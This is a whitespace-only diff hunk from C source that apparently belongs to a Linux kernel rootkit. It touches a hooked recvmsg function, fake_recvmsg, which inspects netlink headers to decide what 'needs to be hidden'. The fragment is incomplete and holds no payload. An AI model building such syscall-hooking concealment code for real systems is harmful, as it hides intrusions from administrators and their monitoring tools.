@@ -290,9 +290,9 @@ asmlinkage ssize_t fake_recvmsg(int sockfd, struct user_msghdr __user *msg, int 
 
 	hdr = (struct nlmsghdr *)msg->msg_iov->iov_base;
 
-    count = ret;
+	count = ret;
 
-    /* indicates if it needs to be hidden */
+	/* indicates if it needs to be hidden */
 	found = 1;
 
 	/* see if header fits in rest of message */
